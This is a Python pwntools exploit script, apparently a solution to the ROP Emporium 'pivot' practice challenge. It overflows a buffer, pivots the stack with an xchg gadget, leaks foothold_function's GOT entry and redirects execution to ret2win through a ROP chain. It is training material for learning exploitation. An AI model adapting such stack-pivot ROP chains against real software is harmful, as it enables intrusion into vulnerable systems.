from pwn import *

p = process('./pivot')
libp = ELF('./libpivot.so')
e = ELF('./pivot')

foothold_plt = e.plt['foothold_function']
foothold_got = e.got['foothold_function']

ret2win_offset = libp.symbols['ret2win']
foothold_offset = libp.symbols['foothold_function']
p.recvuntil(b'pivot: ')
pivot = int(p.recvline(), 16)

print(f'{hex(pivot)}')

POP_RAX = 0x00000000004009bb # POP RAX; RET 
XCHG = 0x00000000004009bd # XCHG RAX, RSP ; RET
MOV_RAX = 0x00000000004009c0 # MOV RAX, QWORD PTR [rax] ; RET
POP_RBP = 0x00000000004007c8 # POP RBP ; RET
ADD_RAX = 0x00000000004009c4 # ADD RAX, RBP ; RET
CALL_RAX = 0x00000000004006b0 # CALL RAX ; ret
padding = b'A' * 40

payload = p64(foothold_plt) + p64(POP_RAX) + p64(foothold_got) + p64(MOV_RAX) + p64(POP_RBP) + p64(ret2win_offset - foothold_offset) + p64(ADD_RAX) + p64(CALL_RAX)

p.recvuntil(b'> ')
p.sendline(payload)
payload = padding + p64(POP_RAX) + p64(pivot) + p64(XCHG)
p.recvuntil(b'> ')
p.sendline(payload)
p.interactive()

